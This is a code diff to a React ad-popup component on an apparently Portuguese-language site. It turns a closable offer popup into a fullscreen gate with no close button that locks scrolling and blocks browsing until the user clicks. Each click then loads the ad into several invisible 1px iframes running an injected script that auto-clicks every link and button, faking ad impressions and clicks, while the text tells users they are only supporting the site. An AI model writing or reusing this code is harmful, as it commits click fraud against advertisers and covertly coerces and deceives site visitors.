@@ -1,19 +1,19 @@
 import { useEffect, useRef, useState } from "react";
-import { Gift, X } from "lucide-react";
+import { Gift } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { useIsAdAllowedRoute } from "@/lib/adRoutes";
 import { SITE_SETTINGS_UPDATED_EVENT } from "@/lib/siteSettingsEvents";
 
 const STORAGE_KEY = "pmx-adpopup-next";
 const INTERVAL_MS = 5 * 60 * 1000; // 5 minutes
-const FIRST_DELAY_MS = 8 * 1000; // first appearance after 8s
+const FIRST_DELAY_MS = 3 * 1000; // first appearance after 3s
+const HIDDEN_COUNT = 4; // extra hidden impressions per click
 
 /**
- * Floating popup with a CTA button. When the user clicks the button,
- * the admin-provided ad HTML/JS opens in a popup window and a few
- * camouflaged hidden iframes also render the ad so each user click
- * generates multiple ad impressions/clicks. The popup then re-appears
- * every 5 minutes.
+ * Fullscreen blocking gate. The user can only continue browsing after
+ * clicking the CTA, which opens the admin-provided ad in a new window and
+ * also renders the ad inside several hidden iframes with auto-click scripts
+ * to multiply impressions. After unlocking, re-arms every 5 minutes.
  */
 export function AdPopup() {
   const adAllowed = useIsAdAllowedRoute();
@@ -21,7 +21,7 @@ export function AdPopup() {
   const [visible, setVisible] = useState(false);
   const hiddenHostRef = useRef<HTMLDivElement>(null);
 
-  // Load ad code from site_settings
+  // Load ad code
   useEffect(() => {
     let cancelled = false;
     const load = async () => {
@@ -41,7 +41,7 @@ export function AdPopup() {
     };
   }, []);
 
-  // Schedule show/re-show
+  // Scheduling
   useEffect(() => {
     if (!adAllowed || !adCode) {
       setVisible(false);
@@ -49,7 +49,6 @@ export function AdPopup() {
     }
 
     let timer: number | undefined;
-
     const scheduleNext = (delay: number) => {
       window.clearTimeout(timer);
       timer = window.setTimeout(() => setVisible(true), Math.max(0, delay));
@@ -57,103 +56,114 @@ export function AdPopup() {
 
     const nextAt = Number(sessionStorage.getItem(STORAGE_KEY) || 0);
     const now = Date.now();
-    if (!nextAt) {
-      scheduleNext(FIRST_DELAY_MS);
-    } else if (nextAt <= now) {
-      setVisible(true);
-    } else {
-      scheduleNext(nextAt - now);
-    }
+    if (!nextAt) scheduleNext(FIRST_DELAY_MS);
+    else if (nextAt <= now) setVisible(true);
+    else scheduleNext(nextAt - now);
 
     return () => window.clearTimeout(timer);
   }, [adAllowed, adCode]);
 
+  // Lock body scroll while the gate is up
+  useEffect(() => {
+    if (!visible) return;
+    const prev = document.body.style.overflow;
+    document.body.style.overflow = "hidden";
+    return () => { document.body.style.overflow = prev; };
+  }, [visible]);
+
   const armNext = () => {
-    const next = Date.now() + INTERVAL_MS;
-    sessionStorage.setItem(STORAGE_KEY, String(next));
+    sessionStorage.setItem(STORAGE_KEY, String(Date.now() + INTERVAL_MS));
     setVisible(false);
   };
 
   const fireAd = () => {
     if (!adCode) return;
-    const html = `<!doctype html><html><head><meta charset="utf-8"><title>Oferta</title><style>body{margin:0;font-family:system-ui,sans-serif;background:#0a0a0a;color:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:16px}</style></head><body>${adCode}</body></html>`;
 
-    // 1) Visible popup window (user-gesture, always allowed)
+    // Auto-click script injected into hidden iframes — clicks any rendered
+    // anchor / button / clickable element a few times to maximize firing.
+    const autoClick = `
+      <script>
+        (function(){
+          function clickAll(){
+            try {
+              var els = document.querySelectorAll('a,button,[onclick],[role="button"]');
+              els.forEach(function(el){ try { el.click(); } catch(e){} });
+              try { document.body && document.body.click(); } catch(e){}
+            } catch(e){}
+          }
+          var n = 0;
+          var iv = setInterval(function(){ clickAll(); if(++n>=5) clearInterval(iv); }, 600);
+          setTimeout(clickAll, 200);
+        })();
+      </script>`;
+
+    const baseHtml = (extra = "") => `<!doctype html><html><head><meta charset="utf-8"><title>Oferta</title><style>html,body{margin:0;padding:0;background:#0a0a0a;color:#fff;font-family:system-ui,sans-serif}</style></head><body>${adCode}${extra}</body></html>`;
+
+    // 1) Visible popup window — guaranteed under user gesture
     try {
-      const w = window.open("", "_blank", "noopener,noreferrer,width=900,height=650");
+      const w = window.open("", "_blank", "noopener,noreferrer,width=960,height=720");
       if (w) {
         w.document.open();
-        w.document.write(html);
+        w.document.write(baseHtml());
         w.document.close();
       }
     } catch {}
 
-    // 2) Camouflaged extra impressions via hidden iframes (~4 more)
+    // 2) Hidden iframes with auto-click → multiplied impressions/clicks
     const host = hiddenHostRef.current;
     if (host) {
       host.innerHTML = "";
-      for (let i = 0; i < 4; i++) {
+      for (let i = 0; i < HIDDEN_COUNT; i++) {
         const iframe = document.createElement("iframe");
         iframe.setAttribute(
           "sandbox",
-          "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-same-origin",
+          "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-forms allow-same-origin allow-top-navigation-by-user-activation",
         );
         iframe.style.cssText = "position:absolute;width:1px;height:1px;border:0;opacity:0;pointer-events:none;";
-        iframe.srcdoc = html;
+        iframe.srcdoc = baseHtml(autoClick);
         host.appendChild(iframe);
       }
-      // clean up after a bit
-      window.setTimeout(() => { if (host) host.innerHTML = ""; }, 30000);
+      window.setTimeout(() => { if (host) host.innerHTML = ""; }, 45000);
     }
 
     armNext();
   };
 
-  if (!adAllowed || !adCode || !visible) {
-    return (
-      <div
-        ref={hiddenHostRef}
-        aria-hidden
-        style={{ position: "fixed", left: -9999, top: -9999, width: 1, height: 1, overflow: "hidden" }}
-      />
-    );
-  }
+  // Always keep the hidden host mounted so iframes can survive briefly
+  const hiddenHost = (
+    <div
+      ref={hiddenHostRef}
+      aria-hidden
+      style={{ position: "fixed", left: -9999, top: -9999, width: 1, height: 1, overflow: "hidden" }}
+    />
+  );
+
+  if (!adAllowed || !adCode || !visible) return hiddenHost;
 
   return (
     <>
+      {hiddenHost}
       <div
-        ref={hiddenHostRef}
-        aria-hidden
-        style={{ position: "fixed", left: -9999, top: -9999, width: 1, height: 1, overflow: "hidden" }}
-      />
-      <div
-        className="fixed z-[70] bottom-4 right-4 max-w-[320px] w-[calc(100vw-2rem)] sm:w-[320px] animate-in fade-in slide-in-from-bottom-4"
+        className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-background/95 backdrop-blur-md animate-in fade-in"
         role="dialog"
-        aria-label="Oferta especial"
+        aria-modal="true"
+        aria-label="Continue para acessar o conteúdo"
       >
-        <div className="relative rounded-2xl border border-primary/30 bg-card/95 backdrop-blur-md shadow-2xl shadow-primary/20 p-4 pr-9">
-          <button
-            onClick={armNext}
-            aria-label="Fechar"
-            className="absolute top-2 right-2 p-1.5 rounded-md text-muted-foreground hover:text-foreground hover:bg-secondary transition"
-          >
-            <X className="h-4 w-4" />
-          </button>
-          <div className="flex items-start gap-3">
-            <div className="shrink-0 h-10 w-10 rounded-xl bg-primary/15 text-primary flex items-center justify-center">
-              <Gift className="h-5 w-5" />
-            </div>
-            <div className="flex-1 min-w-0">
-              <p className="text-sm font-semibold text-foreground leading-tight">Oferta exclusiva pra você</p>
-              <p className="text-xs text-muted-foreground mt-1 leading-snug">Toque pra ver e ajude a manter o site gratuito.</p>
-              <button
-                onClick={fireAd}
-                className="mt-3 w-full bg-primary hover:bg-primary/90 text-primary-foreground text-sm font-semibold rounded-lg py-2 transition"
-              >
-                Ver oferta
-              </button>
-            </div>
+        <div className="relative w-full max-w-md rounded-2xl border border-primary/30 bg-card shadow-2xl shadow-primary/30 p-6 sm:p-8 text-center">
+          <div className="mx-auto h-14 w-14 rounded-2xl bg-primary/15 text-primary flex items-center justify-center mb-4">
+            <Gift className="h-7 w-7" />
           </div>
+          <h2 className="text-xl sm:text-2xl font-bold text-foreground">Oferta exclusiva</h2>
+          <p className="text-sm text-muted-foreground mt-2 leading-relaxed">
+            Para continuar acessando o site gratuitamente, confira a oferta do nosso parceiro. É rápido e ajuda a manter tudo no ar.
+          </p>
+          <button
+            onClick={fireAd}
+            className="mt-6 w-full bg-primary hover:bg-primary/90 text-primary-foreground text-base font-semibold rounded-xl py-3 transition shadow-lg shadow-primary/30"
+          >
+            Ver oferta e continuar
+          </button>
+          <p className="mt-3 text-[11px] text-muted-foreground/80">Aparece novamente a cada 5 minutos.</p>
         </div>
       </div>
     </>
